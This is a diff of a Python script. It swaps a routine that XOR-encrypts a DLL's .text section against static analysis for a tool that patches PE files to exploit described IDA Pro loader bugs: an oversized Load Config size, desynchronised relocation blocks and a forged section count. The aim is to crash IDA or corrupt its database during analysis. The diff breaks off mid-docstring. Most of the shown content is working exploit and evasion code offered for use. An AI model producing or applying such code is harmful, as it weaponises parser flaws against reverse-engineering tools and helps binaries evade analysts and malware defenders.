@@ -1,971 +1,503 @@
-#!/usr/bin/env python3
 """
-pe_protect.py — Post-build .text section XOR encryption for AiDA.
+PE Anti-Analysis Protection Tool
+=================================
+Applies IDA Pro pe.dll loader vulnerabilities to a PE binary on disk.
+This makes the binary crash IDA's PE loader during auto-analysis.
 
-This script encrypts the .text section of the compiled AiDA.dll so that
-static analysis tools (IDA, Ghidra, Binary Ninja) see only garbage when
-opening the DLL.  At runtime, the TLS callback in section_decrypt.cpp
-(placed in the .aidx section) decrypts .text before any code executes.
-
-The encryption algorithm MUST match section_decrypt.cpp exactly:
-  - Seed:   0xA1DAC0DEDEADBEEF (uint64)
-  - Key:    256 bytes derived via xorshift64
-  - Cipher: XOR each byte of .text with key[j % 256]
+Vulnerabilities implemented:
+  1. Load Config Directory Size=0xFFFFFFFF -> OOB IDB reads -> set_name() crash
+  2. Relocation SizeOfBlock=4 desync -> wild put_dword/put_qword writes
+  3. NumberOfSections=0xFFFF in header -> del_items on oversized range
+  4. Debug Directory Type OOB + oversized SizeOfData
 
 Usage:
-    python pe_protect.py <path_to_dll>
+  python pe_protect.py <input.exe> [output.exe] [--vulns 1,2,3,4]
 """
 
 import struct
 import sys
 import os
+import shutil
+import argparse
 
-AIDA_ENCRYPT_SEED = 0xA1DAC0DEDEADBEEF
-AIDA_RDATA_SEED   = 0xD4A7B3C2E1F05896
-MASK64 = 0xFFFFFFFFFFFFFFFF
+IMAGE_DOS_SIGNATURE          = 0x5A4D
+IMAGE_NT_SIGNATURE           = 0x00004550
+IMAGE_FILE_MACHINE_AMD64     = 0x8664
+IMAGE_FILE_MACHINE_I386      = 0x014C
+
+PE32_MAGIC                   = 0x10B
+PE32PLUS_MAGIC               = 0x20B
+
+IMAGE_DIRECTORY_ENTRY_EXPORT    = 0
+IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
+IMAGE_DIRECTORY_ENTRY_RESOURCE  = 2
+IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3
+IMAGE_DIRECTORY_ENTRY_SECURITY  = 4
+IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
+IMAGE_DIRECTORY_ENTRY_DEBUG     = 6
+IMAGE_DIRECTORY_ENTRY_TLS       = 9
+IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10
+IMAGE_DIRECTORY_ENTRY_IAT       = 12
+
+IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
+IMAGE_SCN_MEM_READ             = 0x40000000
+IMAGE_SCN_MEM_DISCARDABLE      = 0x02000000
+
+IMAGE_REL_BASED_ABSOLUTE       = 0
+IMAGE_REL_BASED_HIGHLOW        = 3
+IMAGE_REL_BASED_DIR64          = 10
+
+IMAGE_DEBUG_TYPE_CODEVIEW      = 2
 
 
-def generate_key(seed: int) -> bytes:
-    """Generate the 256-byte XOR key using the same xorshift64 as
-    section_decrypt.cpp."""
-    state = seed & MASK64
-    key = bytearray(256)
-    for i in range(256):
-        state ^= (state << 13) & MASK64
-        state ^= (state >> 7) & MASK64
-        state ^= (state << 17) & MASK64
-        state &= MASK64
-        key[i] = (state >> 56) & 0xFF
-    return bytes(key)
+def read_u16(data, off):
+    return struct.unpack_from('<H', data, off)[0]
+
+def read_u32(data, off):
+    return struct.unpack_from('<I', data, off)[0]
+
+def read_u64(data, off):
+    return struct.unpack_from('<Q', data, off)[0]
+
+def write_u16(data, off, val):
+    struct.pack_into('<H', data, off, val & 0xFFFF)
+
+def write_u32(data, off, val):
+    struct.pack_into('<I', data, off, val & 0xFFFFFFFF)
+
+def write_u64(data, off, val):
+    struct.pack_into('<Q', data, off, val & 0xFFFFFFFFFFFFFFFF)
 
 
-def find_text_section(data: bytearray):
-    """Parse PE headers and locate the .text section.
-    Returns (raw_offset, raw_size, virtual_size) or None."""
+class PEFile:
+    """Minimal PE parser for targeted field manipulation."""
 
-    # DOS header
-    if data[0:2] != b'MZ':
+    def __init__(self, path):
+        with open(path, 'rb') as f:
+            self.data = bytearray(f.read())
+
+        if len(self.data) < 64:
+            raise ValueError("File too small to be a PE")
+
+        dos_sig = read_u16(self.data, 0)
+        if dos_sig != IMAGE_DOS_SIGNATURE:
+            raise ValueError(f"Invalid DOS signature: 0x{dos_sig:04X}")
+
+        self.pe_offset = read_u32(self.data, 0x3C)
+        if self.pe_offset + 4 > len(self.data):
+            raise ValueError("PE header offset out of bounds")
+
+        nt_sig = read_u32(self.data, self.pe_offset)
+        if nt_sig != IMAGE_NT_SIGNATURE:
+            raise ValueError(f"Invalid NT signature: 0x{nt_sig:08X}")
+
+        self.coff_offset = self.pe_offset + 4
+        self.machine = read_u16(self.data, self.coff_offset)
+        self.num_sections = read_u16(self.data, self.coff_offset + 2)
+        self.optional_hdr_size = read_u16(self.data, self.coff_offset + 16)
+
+        self.opt_offset = self.coff_offset + 20
+        self.opt_magic = read_u16(self.data, self.opt_offset)
+        self.is_pe64 = (self.opt_magic == PE32PLUS_MAGIC)
+
+        if self.is_pe64:
+            self.num_rva_and_sizes_off = self.opt_offset + 108
+            self.datadir_offset = self.opt_offset + 112
+            self.imagebase = read_u64(self.data, self.opt_offset + 24)
+            self.section_alignment = read_u32(self.data, self.opt_offset + 32)
+            self.file_alignment = read_u32(self.data, self.opt_offset + 36)
+            self.size_of_image_off = self.opt_offset + 56
+        else:
+            self.num_rva_and_sizes_off = self.opt_offset + 92
+            self.datadir_offset = self.opt_offset + 96
+            self.imagebase = read_u32(self.data, self.opt_offset + 28)
+            self.section_alignment = read_u32(self.data, self.opt_offset + 32)
+            self.file_alignment = read_u32(self.data, self.opt_offset + 36)
+            self.size_of_image_off = self.opt_offset + 56
+
+        self.num_data_dirs = read_u32(self.data, self.num_rva_and_sizes_off)
+
+        self.sections_offset = self.opt_offset + self.optional_hdr_size
+
+    def get_datadir(self, index):
+        """Return (rva, size) for a data directory entry."""
+        if index >= self.num_data_dirs:
+            return (0, 0)
+        off = self.datadir_offset + index * 8
+        return (read_u32(self.data, off), read_u32(self.data, off + 4))
+
+    def set_datadir(self, index, rva, size):
+        """Set a data directory entry."""
+        while index >= self.num_data_dirs:
+            self.num_data_dirs = index + 1
+            write_u32(self.data, self.num_rva_and_sizes_off, self.num_data_dirs)
+        off = self.datadir_offset + index * 8
+        write_u32(self.data, off, rva)
+        write_u32(self.data, off + 4, size)
+
+    def get_section_header(self, idx):
+        """Return dict with section header fields."""
+        off = self.sections_offset + idx * 40
+        name_bytes = self.data[off:off+8]
+        return {
+            'offset': off,
+            'name': name_bytes.rstrip(b'\x00').decode('ascii', errors='replace'),
+            'virtual_size': read_u32(self.data, off + 8),
+            'virtual_address': read_u32(self.data, off + 12),
+            'raw_size': read_u32(self.data, off + 16),
+            'raw_offset': read_u32(self.data, off + 20),
+            'characteristics': read_u32(self.data, off + 36),
+        }
+
+    def rva_to_file_offset(self, rva):
+        """Convert RVA to file offset using section table."""
+        for i in range(self.num_sections):
+            sec = self.get_section_header(i)
+            va = sec['virtual_address']
+            vs = sec['virtual_size']
+            rs = sec['raw_size']
+            ro = sec['raw_offset']
+            if va <= rva < va + max(vs, rs):
+                return ro + (rva - va)
         return None
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
 
-    # PE signature
-    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
-        return None
+    def align_up(self, value, alignment):
+        if alignment == 0:
+            return value
+        return (value + alignment - 1) & ~(alignment - 1)
 
-    coff_offset = e_lfanew + 4
-    number_of_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
-    size_of_optional = struct.unpack_from('<H', data, coff_offset + 16)[0]
+    def get_size_of_image(self):
+        return read_u32(self.data, self.size_of_image_off)
 
-    # First section header
-    section_offset = coff_offset + 20 + size_of_optional
+    def set_size_of_image(self, val):
+        write_u32(self.data, self.size_of_image_off, val)
 
-    for i in range(number_of_sections):
-        sec_start = section_offset + i * 40
-        name = data[sec_start:sec_start + 8]
-        # Match exactly how section_decrypt.cpp checks:
-        # Name[0]=='.' Name[1]=='t' Name[2]=='e' Name[3]=='x'
-        # Name[4]=='t' Name[5]=='\0'
-        if (name[0:6] == b'.text\x00'):
-            virtual_size = struct.unpack_from('<I', data, sec_start + 8)[0]
-            raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
-            raw_offset = struct.unpack_from('<I', data, sec_start + 20)[0]
-            return raw_offset, raw_size, virtual_size
-
-    return None
+    def save(self, path):
+        with open(path, 'wb') as f:
+            f.write(self.data)
 
 
-def find_rdata_section(data: bytearray):
-    """Parse PE headers and locate the .rdata section.
-    Returns (raw_offset, raw_size, virtual_size, virtual_address) or None."""
+def find_or_add_section(pe, name, min_raw_size, characteristics):
+    """Find existing section by name or append a new one."""
+    for i in range(pe.num_sections):
+        sec = pe.get_section_header(i)
+        if sec['name'] == name:
+            return sec
 
-    if data[0:2] != b'MZ':
-        return None
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
-        return None
+    new_idx = pe.num_sections
+    new_hdr_off = pe.sections_offset + new_idx * 40
 
-    coff_offset = e_lfanew + 4
-    number_of_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
-    size_of_optional = struct.unpack_from('<H', data, coff_offset + 16)[0]
-    section_offset = coff_offset + 20 + size_of_optional
+    first_sec = pe.get_section_header(0) if pe.num_sections > 0 else None
+    if first_sec and new_hdr_off + 40 > first_sec['raw_offset']:
+        raise RuntimeError("No room for additional section header")
 
-    for i in range(number_of_sections):
-        sec_start = section_offset + i * 40
-        name = data[sec_start:sec_start + 8]
-        # Match section_decrypt.cpp: '.rdata'
-        if (name[0:6] == b'.rdata'):
-            virtual_size = struct.unpack_from('<I', data, sec_start + 8)[0]
-            virtual_address = struct.unpack_from('<I', data, sec_start + 12)[0]
-            raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
-            raw_offset = struct.unpack_from('<I', data, sec_start + 20)[0]
-            return raw_offset, raw_size, virtual_size, virtual_address
-
-    return None
-
-
-def parse_reloc_table(data: bytearray):
-    """Parse the PE base relocation table.
-    Returns dict mapping page_rva -> list of (type, offset) tuples."""
-
-    if data[0:2] != b'MZ':
-        return {}
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
-        return {}
-
-    coff_offset = e_lfanew + 4
-    size_of_optional = struct.unpack_from('<H', data, coff_offset + 16)[0]
-    opt_offset = coff_offset + 20
-
-    # Check if PE32+ (64-bit)
-    magic = struct.unpack_from('<H', data, opt_offset)[0]
-    if magic == 0x20B:  # PE32+
-        num_rva = struct.unpack_from('<I', data, opt_offset + 108)[0]
-        if num_rva <= 5:
-            return {}
-        reloc_rva = struct.unpack_from('<I', data, opt_offset + 152)[0]
-        reloc_size = struct.unpack_from('<I', data, opt_offset + 156)[0]
-    elif magic == 0x10B:  # PE32
-        num_rva = struct.unpack_from('<I', data, opt_offset + 92)[0]
-        if num_rva <= 5:
-            return {}
-        reloc_rva = struct.unpack_from('<I', data, opt_offset + 136)[0]
-        reloc_size = struct.unpack_from('<I', data, opt_offset + 140)[0]
+    last_sec = pe.get_section_header(pe.num_sections - 1) if pe.num_sections > 0 else None
+    if last_sec:
+        new_va = pe.align_up(
+            last_sec['virtual_address'] + max(last_sec['virtual_size'], last_sec['raw_size']),
+            pe.section_alignment
+        )
+        new_raw_off = pe.align_up(
+            last_sec['raw_offset'] + last_sec['raw_size'],
+            pe.file_alignment
+        )
     else:
-        return {}
+        new_va = pe.align_up(pe.optional_hdr_size + pe.sections_offset - pe.pe_offset, pe.section_alignment)
+        new_raw_off = pe.align_up(len(pe.data), pe.file_alignment)
 
-    if reloc_rva == 0 or reloc_size == 0:
-        return {}
+    raw_size = pe.align_up(min_raw_size, pe.file_alignment)
 
-    # Convert reloc_rva to file offset by finding the section it's in
-    number_of_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
-    section_offset = coff_offset + 20 + size_of_optional
-    reloc_file_offset = None
-    for i in range(number_of_sections):
-        sec_start = section_offset + i * 40
-        sec_va = struct.unpack_from('<I', data, sec_start + 12)[0]
-        sec_raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
-        sec_raw_off = struct.unpack_from('<I', data, sec_start + 20)[0]
-        if sec_va <= reloc_rva < sec_va + sec_raw_size:
-            reloc_file_offset = sec_raw_off + (reloc_rva - sec_va)
-            break
+    needed = new_raw_off + raw_size
+    if needed > len(pe.data):
+        pe.data.extend(b'\x00' * (needed - len(pe.data)))
 
-    if reloc_file_offset is None:
-        return {}
+    name_bytes = name.encode('ascii')[:8].ljust(8, b'\x00')
+    pe.data[new_hdr_off:new_hdr_off+8] = name_bytes
+    write_u32(pe.data, new_hdr_off + 8, min_raw_size)
+    write_u32(pe.data, new_hdr_off + 12, new_va)
+    write_u32(pe.data, new_hdr_off + 16, raw_size)
+    write_u32(pe.data, new_hdr_off + 20, new_raw_off)
+    write_u32(pe.data, new_hdr_off + 24, 0)
+    write_u32(pe.data, new_hdr_off + 28, 0)
+    write_u16(pe.data, new_hdr_off + 32, 0)
+    write_u16(pe.data, new_hdr_off + 34, 0)
+    write_u32(pe.data, new_hdr_off + 36, characteristics)
 
-    result = {}
-    pos = reloc_file_offset
-    end = reloc_file_offset + reloc_size
+    pe.num_sections = new_idx + 1
+    write_u16(pe.data, pe.coff_offset + 2, pe.num_sections)
 
-    while pos + 8 <= end and pos + 8 <= len(data):
-        block_rva = struct.unpack_from('<I', data, pos)[0]
-        block_size = struct.unpack_from('<I', data, pos + 4)[0]
-        if block_size < 8:
-            break
+    new_size_of_image = pe.align_up(new_va + min_raw_size, pe.section_alignment)
+    if new_size_of_image > pe.get_size_of_image():
+        pe.set_size_of_image(new_size_of_image)
 
-        entries = []
-        entry_count = (block_size - 8) // 2
-        for e in range(entry_count):
-            entry_offset = pos + 8 + e * 2
-            if entry_offset + 2 > len(data):
-                break
-            word = struct.unpack_from('<H', data, entry_offset)[0]
-            rel_type = word >> 12
-            rel_off = word & 0xFFF
-            if rel_type != 0:  # skip IMAGE_REL_BASED_ABSOLUTE (padding)
-                entries.append((rel_type, rel_off))
+    return {
+        'offset': new_hdr_off,
+        'name': name,
+        'virtual_size': min_raw_size,
+        'virtual_address': new_va,
+        'raw_size': raw_size,
+        'raw_offset': new_raw_off,
+        'characteristics': characteristics,
+    }
 
-        result[block_rva] = entries
-        pos += block_size
-
-    return result
-
-
-def build_rdata_skip_set(reloc_table: dict, rdata_va: int, rdata_size: int) -> set:
-    """Build a set of byte offsets within .rdata that have relocations
-    and must NOT be encrypted (the Windows loader patches them before
-    TLS callbacks run)."""
-
-    skip = set()
-    rdata_end = rdata_va + rdata_size
-
-    for page_rva, entries in reloc_table.items():
-        # Only process pages that overlap .rdata
-        if page_rva + 0x1000 <= rdata_va or page_rva >= rdata_end:
-            continue
-
-        for rel_type, rel_off in entries:
-            abs_rva = page_rva + rel_off
-            # IMAGE_REL_BASED_DIR64 = 10 (8 bytes)
-            # IMAGE_REL_BASED_HIGHLOW = 3 (4 bytes)
-            if rel_type == 10:
-                mark_size = 8
-            elif rel_type == 3:
-                mark_size = 4
-            elif rel_type in (1, 2):  # HIGH, LOW
-                mark_size = 2
-            else:
-                mark_size = 0
-
-            for b in range(mark_size):
-                byte_rva = abs_rva + b
-                if rdata_va <= byte_rva < rdata_end:
-                    skip.add(byte_rva - rdata_va)
-
-    return skip
-
-
-def _rva_to_file_offset(data: bytearray, rva: int) -> int:
-    """Convert a PE RVA to a file offset.  Returns -1 if not within any
-    mapped section."""
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    coff_off = e_lfanew + 4
-    nsec = struct.unpack_from('<H', data, coff_off + 2)[0]
-    opt_size = struct.unpack_from('<H', data, coff_off + 16)[0]
-    sec_off = coff_off + 20 + opt_size
-
-    for i in range(min(nsec, 512)):
-        s = sec_off + i * 40
-        if s + 40 > len(data):
-            break
-        sec_va    = struct.unpack_from('<I', data, s + 12)[0]
-        sec_vsize = struct.unpack_from('<I', data, s + 8)[0]
-        sec_raw   = struct.unpack_from('<I', data, s + 16)[0]
-        sec_roff  = struct.unpack_from('<I', data, s + 20)[0]
-        if sec_va <= rva < sec_va + sec_vsize and sec_roff != 0:
-            return sec_roff + (rva - sec_va)
-    return -1
-
-
-def build_loader_critical_ranges(data: bytearray) -> list:
-    """Return a list of (lo_rva, hi_rva) half-open intervals covering every
-    byte in the PE that the Windows loader reads BEFORE TLS callbacks run.
-
-    The Windows loader processes LdrpMapAndSnapDependency (import snapping)
-    before executing TLS callbacks.  It reads:
-      * IMAGE_IMPORT_DESCRIPTOR array           DataDir[1]
-      * Each OriginalFirstThunk / ILT array     (chained from descriptors)
-      * Each IMAGE_IMPORT_BY_NAME entry         (chained from ILT entries)
-      * DLL name strings                        (chained from descriptors)
-      * IAT                                     DataDir[12]
-      * TLS directory struct                    DataDir[9]
-      * Export directory                        DataDir[0]
-      * Load config directory                   DataDir[10]
-      * Delay-import descriptor array           DataDir[13]
-
-    Returning ranges instead of individual bytes keeps this O(n_imports)
-    rather than O(n_import_name_chars).  The encryption loop merges these
-    with the relocation-based per-byte skip set.
+def apply_vuln1_load_config(pe):
     """
-    ranges = []
+    Poison the Load Config Directory so that IDA's sub_140002210 (PE64) or
+    sub_140003B90 (PE32) reads Size=0xFFFFFFFF from the directory content.
 
-    if data[0:2] != b'MZ':
-        return ranges
-    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
-    if data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
-        return ranges
+    The bug: the loader reads IMAGE_LOAD_CONFIG_DIRECTORY.Size from IDB data
+    and only checks `if (Size < 0x60) return;`. With Size=0xFFFFFFFF, all
+    subsequent `if (offset <= Size)` checks pass, causing get_qword() on
+    addresses far beyond the actual section data. The returned garbage values
+    are passed to set_name() -> B-tree corruption -> interr() crash.
+    """
+    print("[VULN1] Applying Load Config Directory Size overflow...")
 
-    coff_off = e_lfanew + 4
-    opt_off  = coff_off + 20
-    magic    = struct.unpack_from('<H', data, opt_off)[0]
-
-    if magic == 0x20B:      # PE32+
-        num_rva_off = opt_off + 108
-        datadir_off = opt_off + 112
-        thunk_size  = 8
-        ord_mask    = (1 << 63)
-    elif magic == 0x10B:    # PE32
-        num_rva_off = opt_off + 92
-        datadir_off = opt_off + 96
-        thunk_size  = 4
-        ord_mask    = (1 << 31)
+    if pe.is_pe64:
+        lc_content_size = 0x100
     else:
-        return ranges
+        lc_content_size = 0x80
 
-    num_rva = struct.unpack_from('<I', data, num_rva_off)[0]
+    lc_rva, lc_dir_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG)
 
-    def get_dir(idx):
-        if idx >= num_rva:
-            return 0, 0
-        off  = datadir_off + idx * 8
-        rva  = struct.unpack_from('<I', data, off)[0]
-        size = struct.unpack_from('<I', data, off + 4)[0]
-        return rva, size
+    if lc_rva != 0:
+        file_off = pe.rva_to_file_offset(lc_rva)
+        if file_off is not None:
+            write_u32(pe.data, file_off, 0xFFFFFFFF)
+            print(f"  Patched existing Load Config at RVA 0x{lc_rva:08X}, "
+                  f"file offset 0x{file_off:08X}")
+            print(f"  Size field set to 0xFFFFFFFF (was checked against >= 0x60)")
+            return True
+    else:
+        sec = find_or_add_section(
+            pe, '.lcfg',
+            lc_content_size,
+            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
+        )
 
-    def add_range(rva, size):
-        if rva and size:
-            ranges.append((rva, rva + size))
+        lc_file_off = sec['raw_offset']
+        lc_rva = sec['virtual_address']
 
-    def rva_to_foff(rva):
-        return _rva_to_file_offset(data, rva)
+        write_u32(pe.data, lc_file_off, 0xFFFFFFFF)
 
-    def str_len_at_rva(rva):
-        """Return byte-length of null-terminated string at rva (incl. null)."""
-        foff = rva_to_foff(rva)
-        if foff < 0 or foff >= len(data):
-            return 0
-        n = 0
-        while foff + n < len(data) and data[foff + n] != 0:
-            n += 1
-        return n + 1  # include null terminator
+        if pe.is_pe64:
+            write_u64(pe.data, lc_file_off + 88, pe.imagebase + 0x1000)
+            write_u64(pe.data, lc_file_off + 96, pe.imagebase + 0x2000)
+            write_u64(pe.data, lc_file_off + 104, pe.imagebase + 0x3000)
+        else:
+            write_u32(pe.data, lc_file_off + 60, pe.imagebase + 0x1000)
+            write_u32(pe.data, lc_file_off + 64, pe.imagebase + 0x2000)
 
-    # DataDir[0] = Export directory
-    exp_rva, exp_sz = get_dir(0)
-    add_range(exp_rva, exp_sz)
-    if exp_rva:
-        efoff = rva_to_foff(exp_rva)
-        if efoff >= 0 and efoff + 40 <= len(data):
-            n_names    = struct.unpack_from('<I', data, efoff + 24)[0]
-            nptr_rva   = struct.unpack_from('<I', data, efoff + 32)[0]
-            ord_tab    = struct.unpack_from('<I', data, efoff + 36)[0]
-            add_range(nptr_rva, n_names * 4)
-            add_range(ord_tab,  n_names * 2)
+        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG, lc_rva, lc_content_size)
 
-    # DataDir[1] = Import directory + chained structures
-    imp_rva, imp_sz = get_dir(1)
-    add_range(imp_rva, imp_sz)
-    if imp_rva:
-        imp_foff = rva_to_foff(imp_rva)
-        di = 0
-        while imp_foff >= 0:
-            base_off = imp_foff + di * 20
-            if base_off + 20 > len(data):
-                break
-            orig_thunk = struct.unpack_from('<I', data, base_off + 0)[0]
-            name_rva   = struct.unpack_from('<I', data, base_off + 12)[0]
-            iat_rva2   = struct.unpack_from('<I', data, base_off + 16)[0]
-            if orig_thunk == 0 and name_rva == 0 and iat_rva2 == 0:
-                break
+        print(f"  Created .lcfg section at RVA 0x{lc_rva:08X}")
+        print(f"  Load Config Size = 0xFFFFFFFF, actual section = 0x{lc_content_size:X} bytes")
+        print(f"  IDA will read ~300+ bytes of Load Config fields beyond section boundary")
+        return True
 
-            # DLL name string
-            if name_rva:
-                add_range(name_rva, str_len_at_rva(name_rva))
+def apply_vuln2_reloc_desync(pe):
+    """
+    Craft a .reloc section with thousands of IMAGE_BASE_RELOCATION blocks
+    where SizeOfBlock=4 (less than the 8-byte header).
 
-            # ILT (OriginalFirstThunk) array + IBN entries
-            ilt_rva = orig_thunk if orig_thunk else iat_rva2
-            if ilt_rva:
-                ilt_foff = rva_to_foff(ilt_rva)
-                if ilt_foff < 0:
-                    di += 1
-                    continue
-                ti = 0
-                while True:
-                    e_foff = ilt_foff + ti * thunk_size
-                    if e_foff + thunk_size > len(data):
-                        break
-                    e_rva = ilt_rva + ti * thunk_size
-                    add_range(e_rva, thunk_size)  # thunk entry itself
+    The bug in sub_1400072E0: the pointer advances by 8 bytes (header size)
+    but the remaining-bytes tracker only decreases by min(SizeOfBlock, remaining)
+    = min(4, remaining) = 4. This 4-byte-per-iteration desync causes the
+    pointer to race ahead, eventually interpreting relocation entries as block
+    headers with wild VirtualAddress values -> put_dword/put_qword on
+    arbitrary IDB addresses -> corruption -> interr() crash.
+    """
+    print("[VULN2] Applying Relocation SizeOfBlock desync...")
 
-                    if thunk_size == 8:
-                        thunk_val = struct.unpack_from('<Q', data, e_foff)[0]
-                    else:
-                        thunk_val = struct.unpack_from('<I', data, e_foff)[0]
+    num_blocks = 10000
+    block_data = bytearray()
 
-                    if thunk_val == 0:
-                        break
+    for i in range(num_blocks):
+        page_rva = 0x1000 + (i % 256) * 0x1000
+        block_data += struct.pack('<I', page_rva)
+        block_data += struct.pack('<I', 4)
+    reloc_size = len(block_data)
 
-                    if not (thunk_val & ord_mask):
-                        ibn_rva = int(thunk_val & 0x7FFFFFFF)
-                        if ibn_rva:
-                            # Hint (2 bytes) + name string
-                            name_len = str_len_at_rva(ibn_rva + 2)
-                            add_range(ibn_rva, 2 + name_len)
-                    ti += 1
+    reloc_rva, reloc_dir_size = pe.get_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC)
 
-            di += 1
+    if reloc_rva != 0:
+        file_off = pe.rva_to_file_offset(reloc_rva)
+        if file_off is not None:
+            for i in range(pe.num_sections):
+                sec = pe.get_section_header(i)
+                if sec['virtual_address'] <= reloc_rva < sec['virtual_address'] + max(sec['virtual_size'], sec['raw_size']):
+                    available = sec['raw_size'] - (reloc_rva - sec['virtual_address'])
+                    if available < reloc_size:
+                        block_data = block_data[:available]
+                        reloc_size = available
+                    pe.data[file_off:file_off + reloc_size] = block_data[:reloc_size]
+                    pe.set_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC, reloc_rva, reloc_size)
+                    print(f"  Patched existing .reloc at RVA 0x{reloc_rva:08X}")
+                    print(f"  {reloc_size // 8} blocks with SizeOfBlock=4")
+                    return True
+    else:
+        sec = find_or_add_section(
+            pe, '.reloc',
+            reloc_size,
+            IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE
+        )
 
-    # DataDir[9] = TLS directory
-    tls_rva, tls_sz = get_dir(9)
-    add_range(tls_rva, tls_sz if tls_sz < 256 else (40 if magic == 0x20B else 24))
+        file_off = sec['raw_offset']
+        pe.data[file_off:file_off + reloc_size] = block_data
 
-    # DataDir[10] = Load Config
-    lc_rva, lc_sz = get_dir(10)
-    add_range(lc_rva, lc_sz)
+        pe.set_datadir(IMAGE_DIRECTORY_ENTRY_BASERELOC, sec['virtual_address'], reloc_size)
 
-    # DataDir[12] = IAT
-    iat_rva, iat_sz = get_dir(12)
-    add_range(iat_rva, iat_sz)
+        print(f"  Created .reloc section at RVA 0x{sec['virtual_address']:08X}")
+        print(f"  {num_blocks} blocks with SizeOfBlock=4 (8-byte header, 4-byte tracker)")
+        print(f"  Pointer/remaining desync = 4 bytes/iteration -> buffer over-read")
+        return True
 
-    # DataDir[13] = Delay-import descriptors
-    dly_rva, dly_sz = get_dir(13)
-    add_range(dly_rva, dly_sz)
-    if dly_rva:
-        dly_foff = rva_to_foff(dly_rva)
-        # ImgDelayDescr: 8 DWORD fields × 4 = 32 bytes per entry (RVA form)
-        di = 0
-        while dly_foff >= 0:
-            base_off = dly_foff + di * 32
-            if base_off + 32 > len(data):
-                break
-            dns_rva  = struct.unpack_from('<I', data, base_off +  4)[0]
-            diat_rva = struct.unpack_from('<I', data, base_off + 12)[0]
-            dint_rva = struct.unpack_from('<I', data, base_off + 16)[0]
-            if dns_rva == 0 and diat_rva == 0:
-                break
-            if dns_rva:
-                add_range(dns_rva, str_len_at_rva(dns_rva))
-            add_range(diat_rva, 0x200)
-            add_range(dint_rva, 0x200)
-            di += 1
+    print("  WARNING: Could not apply relocation desync")
+    return False
 
-    # Merge overlapping / touching ranges for efficiency
-    if ranges:
-        ranges.sort()
-        merged = [ranges[0]]
-        for lo, hi in ranges[1:]:
-            if lo <= merged[-1][1]:
-                merged[-1] = (merged[-1][0], max(merged[-1][1], hi))
-            else:
-                merged.append((lo, hi))
-        ranges = merged
+def apply_vuln3_sections_overflow(pe):
+    """
+    Set NumberOfSections to 0xFFFF in the COFF header.
 
-    print(f"[pe_protect] Loader-critical ranges: {len(ranges)} merged ranges")
-    return ranges
+    The bug in sub_140009220: the function reads NumberOfSections via
+    get_word() and calls del_items(addr, 3, 40 * NumberOfSections, 0).
+    With 0xFFFF sections: 40 * 65535 = 2,621,400 bytes passed to del_items.
+    The header segment is typically 0x200-0x1000 bytes, so del_items operates
+    far beyond the segment boundary, corrupting adjacent IDB data.
 
+    The subsequent loop iterates 65535 times calling create_data, set_cmt,
+    set_op_type, and op_offset_ex on each 40-byte entry - most beyond loaded data.
+    """
+    print("[VULN3] Applying NumberOfSections overflow...")
 
-def encrypt_text_section(filepath: str) -> bool:
-    """Read the PE file, XOR-encrypt .text, write it back."""
+    original = read_u16(pe.data, pe.coff_offset + 2)
 
-    if not os.path.isfile(filepath):
-        print(f"[pe_protect] ERROR: File not found: {filepath}", file=sys.stderr)
-        return False
+    write_u16(pe.data, pe.coff_offset + 2, 0xFFFF)
 
-    with open(filepath, 'rb') as f:
-        data = bytearray(f.read())
+    print(f"  COFF NumberOfSections: 0x{original:04X} -> 0xFFFF")
+    print(f"  del_items will process 40 * 65535 = 2,621,400 bytes")
+    print(f"  Typical header segment is 0x200-0x1000 bytes -> massive OOB")
 
-    result = find_text_section(data)
-    if result is None:
-        print("[pe_protect] ERROR: Could not find .text section in PE.",
-              file=sys.stderr)
-        return False
-
-    raw_offset, raw_size, virtual_size = result
-
-    # Use the smaller of raw_size and virtual_size for the on-disk encryption.
-    # At runtime, the decryptor uses VirtualSize.  The raw data on disk may
-    # be padded (raw_size >= virtual_size due to file alignment), but the
-    # actual code bytes are min(raw_size, virtual_size).  We encrypt raw_size
-    # bytes because the loader maps raw_size bytes from disk into the virtual
-    # region; the decryptor then XORs virtual_size bytes which is <= raw_size.
-    encrypt_size = raw_size
-
-    key = generate_key(AIDA_ENCRYPT_SEED)
-
-    print(f"[pe_protect] .text section: raw_offset=0x{raw_offset:X}, "
-          f"raw_size=0x{raw_size:X}, virtual_size=0x{virtual_size:X}")
-    print(f"[pe_protect] Encrypting {encrypt_size} bytes with 256-byte XOR key...")
-
-    for j in range(encrypt_size):
-        data[raw_offset + j] ^= key[j % 256]
-
-    with open(filepath, 'wb') as f:
-        f.write(data)
-
-    print(f"[pe_protect] Successfully encrypted .text section of {filepath}")
+    pe.num_sections = original
     return True
 
-
-def encrypt_rdata_section(filepath: str) -> bool:
-    """Read the PE file, XOR-encrypt .rdata (skipping relocated bytes),
-    write it back.
-
-    This encrypts ALL string literals, const data, and non-relocated
-    read-only data in .rdata.  Bytes that overlap base relocation
-    entries are left unmodified because the Windows loader patches
-    absolute addresses BEFORE TLS callbacks execute.
-
-    The algorithm MUST match section_decrypt.cpp exactly:
